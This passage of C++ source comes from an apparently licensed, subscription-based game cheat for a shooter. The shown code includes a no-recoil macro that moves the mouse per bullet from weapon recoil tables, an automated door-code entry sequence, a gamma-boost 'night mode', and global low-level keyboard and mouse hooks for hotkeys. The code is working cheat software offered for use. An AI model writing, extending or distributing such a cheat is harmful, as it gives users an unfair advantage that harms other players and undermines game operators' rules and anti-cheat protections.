        colors[ImGuiCol_ResizeGripActive] = ImVec4(g_theme_settings.button_active_color.x, g_theme_settings.button_active_color.y, g_theme_settings.button_active_color.z, 0.95f);
        colors[ImGuiCol_Tab] = ImVec4(g_theme_settings.header_color.x - 0.1f, g_theme_settings.header_color.y - 0.1f, g_theme_settings.header_color.z - 0.1f, 0.86f);
        colors[ImGuiCol_TabHovered] = ImVec4(g_theme_settings.button_hovered_color.x, g_theme_settings.button_hovered_color.y, g_theme_settings.button_hovered_color.z, 0.80f);
        colors[ImGuiCol_TabActive] = ImVec4(g_theme_settings.button_active_color.x - 0.1f, g_theme_settings.button_active_color.y - 0.1f, g_theme_settings.button_active_color.z - 0.1f, 1.00f);
        colors[ImGuiCol_TabUnfocused] = ImVec4(g_theme_settings.header_color.x - 0.15f, g_theme_settings.header_color.y - 0.15f, g_theme_settings.header_color.z - 0.15f, 0.97f);
        colors[ImGuiCol_TabUnfocusedActive] = ImVec4(g_theme_settings.header_color.x - 0.1f, g_theme_settings.header_color.y - 0.1f, g_theme_settings.header_color.z - 0.1f, 1.00f);
        
        // تنظیم استایل‌های دیگر
        style.WindowPadding     = ImVec2(10, 10);
        style.FramePadding      = ImVec2(8, 4);
        style.ItemSpacing       = ImVec2(10, 8);
        style.ItemInnerSpacing  = ImVec2(5, 6);
        style.TouchExtraPadding = ImVec2(0, 0);
        style.IndentSpacing     = 25.0f;
        style.ScrollbarSize     = 15.0f;
        style.GrabMinSize       = 10.0f;

        // گرد کردن گوشه‌ها
        style.WindowRounding    = 8.0f;
        style.ChildRounding     = 6.0f;
        style.FrameRounding     = 4.0f;
        style.PopupRounding     = 4.0f;
        style.ScrollbarRounding = 8.0f;
        style.GrabRounding      = 4.0f;
        style.TabRounding       = 6.0f;

        // تنظیم ضخامت خطوط
        style.WindowBorderSize = 1.0f;
        style.ChildBorderSize  = 1.0f;
        style.PopupBorderSize  = 1.0f;
        style.FrameBorderSize  = 0.0f;
        style.TabBorderSize    = 0.0f;
        
        output_log_message("Theme applied successfully\n");
    } catch (const std::exception& e) {
        output_log_message("Error applying theme: " + std::string(e.what()) + "\n");
    } catch (...) {
        output_log_message("Unknown error applying theme\n");
    }
}



// --- Recoil Calculation Functions ---

// Calculates compensation pixels and timing for a single profile based on raw offsets and current settings
RecoilProfileData calculate_recoil_profile(
    const std::vector<double>& base_offset_x, const std::vector<double>& base_offset_y,
    int bullets, double base_time_between_shots_ms,
    const AttachmentState& attachments, // Pass attachment state struct
    bool is_sar_gun)
{
    RecoilProfileData profile;
    profile.bullets = std::min({static_cast<size_t>(bullets), base_offset_x.size(), base_offset_y.size()}); // Ensure bullets doesn't exceed vector size
    profile.is_sar = is_sar_gun;
    profile.is_muzzle_boost = attachments.muzzle_boost; // Use muzzle_boost from the struct
    profile.is_muzzle_brake = attachments.muzzle_brake;

    // Use the globally calculated screenMultiplier
    double local_screen_multiplier = (screenMultiplier != 0) ? screenMultiplier : -0.01; // Fallback

    // Determine attachment multipliers based on the passed struct
    // NOTE: These multipliers are hardcoded here. For a more robust solution,
    // these should ideally be stored per-gun or in a separate structure.
    double scope_holo_mult = attachments.holo ? 1.2 : 1.0;
    double scope_8x_mult = attachments.x8 ? 6.9 : 1.0; // AK default
    double scope_16x_mult = attachments.x16 ? 13.5 : 1.0; // AK default
    double scope_handmade_mult = attachments.handmade ? 0.8 : 1.0;
    double barrel_muzzle_boost_rpm = attachments.muzzle_boost ? 1.1 : 1.0; // AK default

    // Calculate the combined multiplier for recoil compensation (Multiplying all four scope multipliers)
    double effective_recoil_multiplier = scope_holo_mult * scope_8x_mult * scope_16x_mult * scope_handmade_mult;

    // Calculate the effective time between shots based on RPM multiplier
    double effective_time_between_shots = (attachments.muzzle_boost && barrel_muzzle_boost_rpm != 1.0) ? // Use attachments.muzzle_boost
                                          (base_time_between_shots_ms / barrel_muzzle_boost_rpm) : base_time_between_shots_ms;


    profile.comp_x.reserve(profile.bullets);
    profile.comp_y.reserve(profile.bullets);
    profile.action_time.reserve(profile.bullets);
    profile.sleep_time.reserve(profile.bullets);

    for (int i = 0; i < profile.bullets; ++i) {
        // Calculate the pixel compensation needed based on offsets and multipliers
        // Using the division formula from interseption.cpp
        int c_x = custom_round((base_offset_x[i] / local_screen_multiplier) * effective_recoil_multiplier);
        int c_y = custom_round((base_offset_y[i] / local_screen_multiplier) * effective_recoil_multiplier);

        // Calculate action and sleep times per bullet (Using original logic)
        double at = 0.0; // Action Time
        double st = 0.0; // Sleep Time

        if (is_sar_gun) {
            at = 145.0; // Example action time for SAR
            st = (effective_time_between_shots > at) ? (effective_time_between_shots - at) : 0.0;
        } else { // Logic for other guns
            at = 100.0; // Example action time for other guns
            st = (effective_time_between_shots > at) ? (effective_time_between_shots - at) : 0.0;
        }

        profile.comp_x.push_back(c_x);
        profile.comp_y.push_back(c_y);
        profile.action_time.push_back(std::max(1.0, at)); // Ensure action time is at least 1ms
        profile.sleep_time.push_back(std::max(0.0, st));  // Ensure sleep time is not negative
    }

    return profile;
}


// اطمینان از این‌که وکتورهای per-gun از recoil_tables پر شده‌اند
// Recalculates ALL profiles based on current SENS/FOV and attachment states
void recalculate_all_profiles_threadsafe() {
    // Calculate screen multiplier based on sensitivity and FOV
    // This is a critical calculation that affects all recoil patterns
    if (FOV <= 0) {
        output_log_message("Warning: FOV is zero or negative. Using default multiplier.\n");
        screenMultiplier = -0.01; // Default fallback
    } else {
         // Formula matching interseption.cpp: -0.03 * (SENSITIVITY * 3.0) * (FOV / 100.0)
         // This value will be used for DIVISION, not multiplication in compensation calculations
         screenMultiplier = -0.03 * ((SENSITIVITY) * 3.0 ) * (FOV / 100.0);
    }
     output_log_message("Recalculating profiles with Sens=" + std::to_string(SENSITIVITY) + ", FOV=" + std::to_string(FOV) + ", Base Multiplier=" + std::to_string(screenMultiplier) + "\n");

    // Use mutex to safely update the shared profile map
    std::lock_guard<std::mutex> lock(profile_mutex); // Lock before modifying calculated_profiles

    // --- Recalculate profiles using the new function signature and consolidated attachments ---
    // Pass the attachment state struct directly to calculate_recoil_profile
    calculated_profiles[PROFILE_AK47] = calculate_recoil_profile(
        AK47_OFFSET_X, AK47_OFFSET_Y, AK47_BULLETS, AK47_RPM_DELAY,
        g_attachment_states[PROFILE_AK47], // Pass the struct
        false);

    calculated_profiles[PROFILE_LR300] = calculate_recoil_profile(
        LR300_OFFSET_X, LR300_OFFSET_Y, LR300_BULLETS, LR300_RPM_DELAY,
        g_attachment_states[PROFILE_LR300], // Pass the struct
        false);

    calculated_profiles[PROFILE_THOMPSON] = calculate_recoil_profile(
        THOMPSON_OFFSET_X, THOMPSON_OFFSET_Y, THOMPSON_BULLETS, THOMPSON_RPM_DELAY,
        g_attachment_states[PROFILE_THOMPSON], // Pass the struct
        false);

    calculated_profiles[PROFILE_SAR] = calculate_recoil_profile(
        SAR_OFFSET_X, SAR_OFFSET_Y, SAR_BULLETS, SAR_RPM_DELAY,
        g_attachment_states[PROFILE_SAR], // Pass the struct
        true); // SAR is a SAR gun

    calculated_profiles[PROFILE_MP5A4] = calculate_recoil_profile(
        MP5A4_OFFSET_X, MP5A4_OFFSET_Y, MP5A4_BULLETS, MP5A4_RPM_DELAY,
        g_attachment_states[PROFILE_MP5A4], // Pass the struct
        false); // MP5A4 is not SAR

    calculated_profiles[PROFILE_HMLMG] = calculate_recoil_profile(
        HMLMG_OFFSET_X, HMLMG_OFFSET_Y, HMLMG_BULLETS, HMLMG_RPM_DELAY,
        g_attachment_states[PROFILE_HMLMG], // Pass the struct
        false); // HMLMG is not SAR

    calculated_profiles[PROFILE_M249] = calculate_recoil_profile(
        M249_OFFSET_X, M249_OFFSET_Y, M249_BULLETS, M249_RPM_DELAY,
        g_attachment_states[PROFILE_M249], // Pass the struct
        false); // M249 is not SAR

    // Mutex automatically released when lock goes out of scope
}

// --- Recoil Control Thread ---
void perform_recoil_control() {
    // Label for goto jumps from inner loops if global state changes
    check_global_state_outer:;
    // Recoil thread log removed

    // Outer loop: Continuously checks for activation conditions
    while (g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
        // 1. Check Global State (License, Global Toggle) - Run at the beginning of each major cycle
        auto now_global = std::chrono::system_clock::now();
        // Read license data safely
        long long duration_check;
        std::chrono::system_clock::time_point activation_time_check;
        bool is_licensed_check = is_licensed.load(std::memory_order_relaxed);
        {
            std::lock_guard<std::mutex> lock(g_license_data_mutex);
            duration_check = g_subscription_duration_seconds;
            activation_time_check = g_activation_time;
        }
        auto expiration_time_global = activation_time_check + std::chrono::seconds(duration_check);
        bool is_currently_licensed_and_valid = is_licensed_check && now_global < expiration_time_global;
        
        if (!is_currently_licensed_and_valid) {
            // Handle expiration if needed
            if (is_licensed_check && now_global >= expiration_time_global) {
                 is_licensed.store(false); // Mark as unlicensed
                 { // Reset license data under mutex
                     std::lock_guard<std::mutex> lock(g_license_data_mutex);
                     g_activation_time = std::chrono::system_clock::time_point();
                     g_subscription_duration_seconds = 0;
                     g_start_license_str = "N/A";
                 }
                 output_log_message("License expired. Script deactivated.\n");
            }
            sleep_ms(250); // Sleep longer when inactive
            continue; // Re-check global state
        }

        // 2. Wait for Initial Trigger (RMB down)
        // Recoil thread log removed
        while (!right_mouse_down.load(std::memory_order_relaxed)) {
            if (!g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
                return; // Thread is being asked to stop
            }
            sleep_ms(5);
            // Periodically re-check global state while waiting for RMB
            auto now_wait_rmb = std::chrono::system_clock::now();
            // Re-read license data for check
            bool is_licensed_wait; long long duration_wait; std::chrono::system_clock::time_point activation_wait;
             { std::lock_guard<std::mutex> lock(g_license_data_mutex); is_licensed_wait = is_licensed.load(); duration_wait = g_subscription_duration_seconds; activation_wait = g_activation_time;}
             auto expiration_time_wait_rmb = activation_wait + std::chrono::seconds(duration_wait);
             if (!(is_licensed_wait && now_wait_rmb < expiration_time_wait_rmb)) {
                 // Recoil thread log removed
                 goto check_global_state_outer; // Jump to the outer check if state changes
             }
        }

        // --- RMB is now PRESSED ---
        // Recoil thread log removed

        // 3. RMB is Down - Check for Active Profile (and keep checking RMB is still down)
        // Declare variables needed within the RMB-held scope here
        std::string active_profile_name_local;
        RecoilProfileData current_profile_local;
        bool profile_is_ready = false; // Initialize here

        // Loop while RMB is held down
        while (right_mouse_down.load(std::memory_order_relaxed)) {
            if (!g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
                return; // Thread is being asked to stop
            }

            // 3a. Check Global State within RMB loop
            auto now_rmb_held = std::chrono::system_clock::now();
            // Re-read license data
             bool is_licensed_rmb; long long duration_rmb; std::chrono::system_clock::time_point activation_rmb;
             { std::lock_guard<std::mutex> lock(g_license_data_mutex); is_licensed_rmb = is_licensed.load(); duration_rmb = g_subscription_duration_seconds; activation_rmb = g_activation_time;}
             auto expiration_time_rmb_held = activation_rmb + std::chrono::seconds(duration_rmb);
             if (!(is_licensed_rmb && now_rmb_held < expiration_time_rmb_held)) {
                 // Recoil thread log removed
                 goto check_global_state_outer; // Exit RMB-held loop if global state changes
             }

            // 3b. Get Active Profile if not already retrieved in this RMB-held session OR if profile was potentially changed
            // For simplicity, let's re-check the profile at the start of each potential spray within the RMB-held state.
            profile_is_ready = false; // Reset readiness check
            {
                std::lock_guard<std::mutex> lock(profile_mutex);
                // بررسی وضعیت کلید UI toggle - فقط زمانی که کلید فشرده شده باشد، قابلیت no recoil فعال می‌شود
                bool profile_active = profile_macro_active.load(std::memory_order_relaxed);
                bool ui_key_pressed = ui_toggle_key_pressed.load(std::memory_order_relaxed);
                bool profile_not_empty = !current_gun_profile_str.empty();
                bool profile_exists = calculated_profiles.count(current_gun_profile_str) > 0;
                
                // لاگ برای بررسی وضعیت متغیرها
                output_log_message("Recoil check - Profile active: " + std::to_string(profile_active) + ", UI key pressed: " + std::to_string(ui_key_pressed) + ", Profile not empty: " + std::to_string(profile_not_empty) + ", Profile exists: " + std::to_string(profile_exists) + "\n");
                
                if (profile_active && ui_key_pressed && profile_not_empty && profile_exists) {
                    active_profile_name_local = current_gun_profile_str;
                    // Make a copy of the profile data. This is important as recalculate_all_profiles can modify the original map.
                    current_profile_local = calculated_profiles.at(active_profile_name_local);
                    profile_is_ready = true;
                }
            }

            if (!profile_is_ready) {
                // RMB is held, but no profile active. Keep waiting while RMB is held.
                // Recoil thread log removed
                sleep_ms(10); // Slightly longer sleep as no profile is active
                continue; // Continue the outer RMB-while loop
            }

            // 4. Profile is Ready & RMB is Held - Wait for LMB Press
            // Recoil thread log removed
            if (!left_mouse_down.load(std::memory_order_relaxed)) {
                sleep_ms(5); // Poll frequently for LMB press
                continue; // Continue the outer RMB-while loop, waiting for LMB
            }

            // --- LMB is now PRESSED (and RMB is still held) ---
            // Recoil thread log removed
            // Add debug log here to confirm LMB detection after the check
            // Recoil thread log removed

            // 5. Perform Recoil Spray
            stop_recoil_flag.store(false, std::memory_order_relaxed); // Reset stop flag for the new spray
            sleep_ms(5); // Small initial delay before the first shot compensation

            // Re-check buttons/keys after initial delay before starting the spray
            if (!left_mouse_down.load(std::memory_order_relaxed) || !right_mouse_down.load(std::memory_order_relaxed)) {
                // Buttons released during the small delay. Stop this attempt.
                // Recoil thread log removed
                stop_recoil_flag.store(true);
                // The outer while loop `while (right_mouse_down)` will handle exiting or continuing based on RMB state.
                continue;
            }

            // --- Recoil Loop ---
            // Recoil thread log removed
            bool exit_spray_loop_completely = false; // Flag to indicate if we should exit the outer RMB-held loop
            for (size_t bullet_index = 0; bullet_index < static_cast<size_t>(current_profile_local.bullets); ++bullet_index) {
                if (!g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
                    return; // Thread is being asked to stop
                }

                // Read current state of mouse buttons at the start of each bullet iteration
                bool lmb_down_current = left_mouse_down.load(std::memory_order_relaxed);
                bool rmb_down_current = right_mouse_down.load(std::memory_order_relaxed);

                // Check global state and RMB release first (conditions for complete exit)
                auto now_spray = std::chrono::system_clock::now();
                bool is_licensed_spray; long long duration_spray; std::chrono::system_clock::time_point activation_spray;
                { std::lock_guard<std::mutex> lock(g_license_data_mutex); is_licensed_spray = is_licensed.load(); duration_spray = g_subscription_duration_seconds; activation_spray = g_activation_time;}
                auto expiration_time_spray = activation_spray + std::chrono::seconds(duration_spray);
                bool is_currently_licensed_and_valid_spray = is_licensed_spray && now_spray < expiration_time_spray;
                
                if (stop_recoil_flag.load(std::memory_order_relaxed) ||
                    !is_currently_licensed_and_valid_spray ||
                    !rmb_down_current) // If RMB is released, exit completely
                {
                    // Recoil thread log removed
                    stop_recoil_flag.store(true); // Ensure flag is set
                    exit_spray_loop_completely = true; // Set flag for complete exit
                    break; // Break the inner bullet loop
                }

                // If RMB is still down, check if LMB is released (condition for stopping current spray)
                if (!lmb_down_current) // If LMB is released (and RMB is still down based on the above check)
                {
                    // Recoil thread log removed
                    stop_recoil_flag.store(true); // Ensure flag is set
                    // No need to set exit_spray_loop_completely here, as RMB is still down
                    break; // Break the inner bullet loop
                }

                double current_st = current_profile_local.sleep_time[bullet_index];
                bool is_crouched = is_key_down(VK_LCONTROL); // Example crouch key
                // Recoil compensation logic
                double final_comp_x = 0;
                double final_comp_y = 0;

                // Get base compensation from the current profile
                double base_comp_x = current_profile_local.comp_x[bullet_index];
                double base_comp_y = current_profile_local.comp_y[bullet_index];

                // Muzzle Brake: Reduce recoil by 50% if used
                if (current_profile_local.is_muzzle_brake) {
                    base_comp_x *= 0.5;
                    base_comp_y *= 0.5;
                }

                // Apply stance multipliers
                if (!is_crouched) {
                    double current_stand_multiplier = StandMultiplier;
                    // Gun-specific adjustments (only apply if standing)
                    if (active_profile_name_local == PROFILE_AK47) {
                        current_stand_multiplier *= 1.05;
                    }

                    final_comp_x = custom_round(base_comp_x * current_stand_multiplier * 1.0); // X less affected when standing
                    final_comp_y = custom_round(base_comp_y * current_stand_multiplier);

                    // Muzzle boost adjustments after certain bullets (only if standing)
                    if (current_profile_local.is_muzzle_boost && bullet_index > 16) {
                        if (active_profile_name_local == PROFILE_AK47 || active_profile_name_local == PROFILE_MP5A4) {
                            final_comp_x = custom_round(base_comp_x * (-0.1));
                            final_comp_y = custom_round(base_comp_y * current_stand_multiplier); // Use current_stand_multiplier here
                        } else if (active_profile_name_local == PROFILE_LR300 || active_profile_name_local == PROFILE_THOMPSON) {
                            final_comp_x = base_comp_x; // No X change for these?
                            final_comp_y = custom_round(base_comp_y * StandMultiplier); // Use base StandMultiplier here
                        } else {
                            // Default stance logic for other guns with muzzle boost (only if standing)?
                            final_comp_x = custom_round(base_comp_x * current_stand_multiplier);
                            final_comp_y = custom_round(base_comp_y * current_stand_multiplier);
                        }
                    }
                } else {
                    // If crouched, use base compensation without stand multiplier
                    final_comp_x = base_comp_x;
                    final_comp_y = base_comp_y;
                     // No muzzle boost adjustments when crouched based on typical recoil patterns
                }

                double current_at = current_profile_local.action_time[bullet_index];

                // Handle SAR specific key press
                if (current_profile_local.is_sar) {
                    press_key_vk(VK_PAUSE);
                    sleep_ms(10);
                    release_key_vk(VK_PAUSE);
                }

                // Apply smoothing for the action time
                smoothing(current_at, final_comp_x, final_comp_y);

                // Sleep for the remaining time
                if (!stop_recoil_flag.load(std::memory_order_relaxed)) {
                    sleep_ms(static_cast<int>(current_st));
                }

            } // End of bullet loop

            // Check if we need to exit the outer RMB-held loop
            if (exit_spray_loop_completely) {
                goto check_global_state_outer;
            }

        } // End of RMB-held loop `while (right_mouse_down.load())`

    } // End of main while(true) loop
}

// --- Door Unlocker Sequence Function ---
void perform_door_unlock_sequence(int key_code) {
    if (key_code < 0 || key_code > 9999) {
        output_log_message("Invalid door unlock code: " + std::to_string(key_code) + ". Sequence skipped.\n");
        return;
    }
     if (key_code == 0) {
         output_log_message("Door unlock code is 0, sequence skipped.\n");
         return;
     }

    output_log_message("Starting door unlock sequence for code: " + std::to_string(key_code) + "\n");

    // Extract digits (ensure 4 digits by padding with leading zeros if needed for logic)
    // The sequence logic assumes 4 digits are pressed.
    // We need to convert the integer code into 4 separate digits.
    int n1_int = key_code % 10;        // Units digit
    int n2_int = (key_code / 10) % 10; // Tens digit
    int n3_int = (key_code / 100) % 10; // Hundreds digit
    int n4_int = (key_code / 1000) % 10; // Thousands digit


    // Convert integer digits to VK codes for '0' through '9' using character literals
    int n1_vk = '0' + n1_int;
    int n2_vk = '0' + n2_int;
    int n3_vk = '0' + n3_int;
    int n4_vk = '0' + n4_int;

    // Sequence of actions based on Lua code
    press_key_vk('E'); // Press 'E' key using character literal
    sleep_ms(250);
    move_mouse_relative_core(50, 50);
    sleep_ms(70);
    press_key_vk(VK_LBUTTON); // Press Left Mouse Button
    sleep_ms(1);
    release_key_vk(VK_LBUTTON); // Release Left Mouse Button
    sleep_ms(70);
    release_key_vk('E'); // Release 'E' key using character literal
    sleep_ms(40);

    // Press and release digits
    // Need a small delay between press and release for each digit
    int digit_press_release_delay = 20; // Example delay in ms

    // Press digits in the order 4, 3, 2, 1 (Thousands to Units)
    press_key_vk(n4_vk);
    sleep_ms(digit_press_release_delay);
    release_key_vk(n4_vk);
    sleep_ms(40);

    press_key_vk(n3_vk);
    sleep_ms(digit_press_release_delay);
    release_key_vk(n3_vk);
    sleep_ms(40);

    press_key_vk(n2_vk);
    sleep_ms(digit_press_release_delay);
    release_key_vk(n2_vk);
    sleep_ms(40);

    press_key_vk(n1_vk);
    sleep_ms(digit_press_release_delay);
    release_key_vk(n1_vk);
    sleep_ms(40);

    output_log_message("Door unlock sequence finished.\n");
}

// --- Hook Procedures ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        int vkCode = kbdStruct->vkCode;

        // --- Handle Key Down Events ---
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

             // Check if we are currently capturing a keybind
             if (g_is_capturing_keybind.load(std::memory_order_relaxed)) {
                 if (g_profile_being_rebound == "DOOR_UNLOCK_TRIGGER") {
                     // UI Toggle, Exit, and Global Toggle keys are handled below and allowed through
                     // Consume all other keyboard presses while capturing Door Unlock Trigger
                     return 1;
                 }

                 if (vkCode != VK_SHIFT && vkCode != VK_CONTROL && vkCode != VK_MENU &&
                     vkCode != VK_LSHIFT && vkCode != VK_RSHIFT &&
                     vkCode != VK_LCONTROL && vkCode != VK_RCONTROL &&
                     vkCode != VK_LMENU && vkCode != VK_RMENU &&
                     (vkCode < VK_LBUTTON || vkCode > VK_XBUTTON2)) // Exclude mouse buttons
                 {
                     // Update the keybind based on what is being rebound
                     {
                         std::lock_guard<std::mutex> lock(profile_mutex); // Protect g_profile_keybinds
                         if (g_profile_being_rebound == "LMB") {
                              g_lmb_key.store(vkCode);
                              output_log_message("LMB Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         } else if (g_profile_being_rebound == "RMB") {
                              g_rmb_key.store(vkCode);
                              output_log_message("RMB Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         }
                         // Special keys (UI_TOGGLE, EXIT_APP, GLOBAL_MACRO_TOGGLE)
                         else if (g_profile_being_rebound == "UI_TOGGLE") {
                              g_ui_toggle_key.store(vkCode);
                              output_log_message("UI Toggle Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         } else if (g_profile_being_rebound == "EXIT_APP") {
                              g_exit_app_key.store(vkCode);
                              output_log_message("Exit App Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         // بخش مربوط به Global Macro Toggle حذف شد
                         } else if (g_profile_being_rebound == "NIGHT_MODE_KEY") {
                              g_nightModeKey.store(vkCode);
                              output_log_message("Night Mode Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         }
                         // Weapon profile keybinds
                         else if (!g_profile_being_rebound.empty() && g_profile_keybinds.count(g_profile_being_rebound)) {
                             g_profile_keybinds[g_profile_being_rebound] = vkCode;
                             output_log_message("Keybind for " + g_profile_being_rebound + " set to " + vk_code_to_string(vkCode) + "\n");
                         }
                          else {
                              // Should not happen if g_profile_being_rebound is set correctly by the UI
                              output_log_message("Warning: Keyboard hook captured key while capturing state was invalid.\n");
                          }
                     }
                     // Reset the capturing state
                     g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                     g_profile_being_rebound = ""; // Clear the profile name

                     // Consume the key press so it doesn't trigger other actions
                     return 1;
                 }
                  // Consume other key presses while capturing
                  return 1;
             }


            if (vkCode == g_nightModeKey.load(std::memory_order_relaxed)) {
                if (!toggle_key_states[vkCode]) {
                    if (g_isLoggedIn.load(std::memory_order_relaxed)) {
                        if (!g_isGammaInitialized) {
                            InitializeGammaControls();
                        }

                        if (g_isGammaInitialized) {
                            g_isGammaBoosted = !g_isGammaBoosted;
                            ApplyCurrentGammaRamp();
                        }
                    }

                    toggle_key_states[vkCode] = true;
                }
                return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
            }

            // Normal key handling when not capturing (only process if licensed AND not expired)
            auto now = std::chrono::system_clock::now();
            auto expiration_time = g_activation_time + std::chrono::seconds(g_subscription_duration_seconds);
            bool is_currently_licensed_and_valid = is_licensed.load(std::memory_order_relaxed) && now < expiration_time;

            if (is_currently_licensed_and_valid) {

                // Check for UI toggle key (toggle only on first down event)
                if (vkCode == g_ui_toggle_key.load(std::memory_order_relaxed)) {
                    if (!toggle_key_states[vkCode]) { // Only process if not already processed as down
                        // تغییر وضعیت نمایش پنجره
                        bool current_visibility = show_config_window_atomic.load(std::memory_order_relaxed);
                        show_config_window_atomic.store(!current_visibility);
                        if (hwnd) {
                            ::ShowWindow(hwnd, show_config_window_atomic.load() ? SW_SHOW : SW_HIDE);
                            output_log_message("Window visibility changed. New visibility: " + std::to_string(show_config_window_atomic.load()) + "\n");
                        }
                        
                        // تغییر وضعیت فعال بودن قابلیت no recoil
                        bool current_ui_toggle_state = ui_toggle_key_pressed.load(std::memory_order_relaxed);
                        ui_toggle_key_pressed.store(!current_ui_toggle_state);
                        output_log_message("UI toggle key pressed. New toggle state: " + std::to_string(ui_toggle_key_pressed.load()) + "\n");
                        
                        toggle_key_states[vkCode] = true; // Mark as processed
                    }
                    return 1; // Consume the key
                }

                // Check for Exit key (action only on first down event)
                if (vkCode == g_exit_app_key.load(std::memory_order_relaxed)) {
                    if (!toggle_key_states[vkCode]) { // Prevent repeat exit messages
                        if (hwnd) {
                            ::PostMessage(hwnd, WM_DESTROY, 0, 0);
                        }
                        toggle_key_states[vkCode] = true; // Mark as processed
                    }
                    return 1; // Consume the key
                }

                // Check for weapon profile keybinds (toggle profile_macro_active AND set profile)
                std::string target_profile = "";
                {
                    std::lock_guard<std::mutex> lock(profile_mutex);
                    for (const auto& pair : g_profile_keybinds) {
                        if (pair.second == vkCode) {
                            target_profile = pair.first;
                            break;
                        }
                    }
                }
                if (!target_profile.empty()) {
                    if (!toggle_key_states[vkCode]) { // Only process if not already processed as down
                        std::lock_guard<std::mutex> lock(profile_mutex);
                        bool current_active_state = profile_macro_active.load(std::memory_order_relaxed);
                        std::string current_profile_name = current_gun_profile_str;

                        // Toggle logic: If currently active with this profile, deactivate. Otherwise, activate with this profile.
                        if (!(current_active_state && current_profile_name == target_profile)) {
                            profile_macro_active.store(true);
                            current_gun_profile_str = target_profile;
                            output_log_message(current_gun_profile_str + "_MACRO-ON (Profile selected)\n");
                        }
                        toggle_key_states[vkCode] = true; // Mark as processed
                    }
                    // Don't consume weapon keybinds if they are also used in-game (e.g., F keys for actions)
                    // return 1; // Optional: Consume key press if you don't want it passed to the game
                }

                // Check for LMB/RMB key presses if they're bound to keyboard keys
                int lmb_vk = g_lmb_key.load(std::memory_order_relaxed);
                int rmb_vk = g_rmb_key.load(std::memory_order_relaxed);

                if (vkCode == lmb_vk) {
                    left_mouse_down.store(true, std::memory_order_relaxed);
                }
                if (vkCode == rmb_vk) {
                    right_mouse_down.store(true, std::memory_order_relaxed);
                }
            }
        }
        // --- Handle Key Up Events ---
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
             // Reset the processed state for the key when it's released
             if (toggle_key_states.count(vkCode)) {
                 toggle_key_states[vkCode] = false;
             }
             
             // بخش مربوط به رها کردن کلید UI toggle حذف شد چون حالا به صورت toggle کار می‌کند

             // Check for LMB/RMB key releases if they're bound to keyboard keys
             int lmb_vk = g_lmb_key.load(std::memory_order_relaxed);
             int rmb_vk = g_rmb_key.load(std::memory_order_relaxed);

             if (vkCode == lmb_vk) {
                 left_mouse_down.store(false, std::memory_order_relaxed);
                 stop_recoil_flag.store(true); // Signal recoil thread to stop on LMB/RMB release
             }
             if (vkCode == rmb_vk) {
                 right_mouse_down.store(false, std::memory_order_relaxed);
                 stop_recoil_flag.store(true); // Signal recoil thread to stop on LMB/RMB release
             }
        }
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {
        MSLLHOOKSTRUCT* msStruct = (MSLLHOOKSTRUCT*)lParam;
        int vkCode = 0; 

        switch (wParam) {
            case WM_LBUTTONDOWN: case WM_LBUTTONUP:   vkCode = VK_LBUTTON; break;
            case WM_RBUTTONDOWN: case WM_RBUTTONUP:   vkCode = VK_RBUTTON; break;
            case WM_MBUTTONDOWN: case WM_MBUTTONUP:   vkCode = VK_MBUTTON; break;
            case WM_XBUTTONDOWN: case WM_XBUTTONUP:
                if (GET_XBUTTON_WPARAM(msStruct->mouseData) == XBUTTON1) vkCode = VK_XBUTTON1;
                else if (GET_XBUTTON_WPARAM(msStruct->mouseData) == XBUTTON2) vkCode = VK_XBUTTON2;
                break;
        }

        if (g_is_capturing_keybind.load(std::memory_order_relaxed)) {

             if (g_profile_being_rebound == "DOOR_UNLOCK_TRIGGER") {
                 if (vkCode != 0 && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_XBUTTONDOWN)) {
                     // Update the Door Unlock Trigger keybind
                     g_door_unlock_trigger_key = vkCode;
                     output_log_message("Door Unlock Trigger Keybind set to " + vk_code_to_string(vkCode) + "\n");

                     // Reset the capturing state
                     g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                     g_profile_being_rebound = ""; // Clear the profile name

                     return 1; 
                 }
                 return 1;
             }
             // If capturing other keybinds (weapon, UI toggle, Exit, Global Toggle, LMB, RMB)
             else {
                 if (vkCode != 0 && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_XBUTTONDOWN)) {
                     {
                         std::lock_guard<std::mutex> lock(profile_mutex); // Protect keybind variables
                         if (g_profile_being_rebound == "LMB") {
                             g_lmb_key.store(vkCode);
                             output_log_message("LMB Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         } else if (g_profile_being_rebound == "RMB") {
                             g_rmb_key.store(vkCode);
                             output_log_message("RMB Keybind set to " + vk_code_to_string(vkCode) + "\n");
                         }
                         // Weapon profiles, UI_TOGGLE, EXIT_APP, GLOBAL_MACRO_TOGGLE are handled in keyboard hook
                     }
                     // Reset the capturing state if LMB/RMB was successfully captured
                     if (g_profile_being_rebound == "LMB" || g_profile_being_rebound == "RMB") {
                         g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                         g_profile_being_rebound = ""; // Clear the profile name
                     }
                     return 1; 
                 }
                 return 1;
             }
        }


        auto now = std::chrono::system_clock::now();
        auto expiration_time = g_activation_time + std::chrono::seconds(g_subscription_duration_seconds);
        bool is_currently_licensed_and_valid = is_licensed.load(std::memory_order_relaxed) && now < expiration_time;


        if (is_currently_licensed_and_valid) {
            // --- Check for Door Unlocker Trigger ---
            // Trigger on button DOWN event
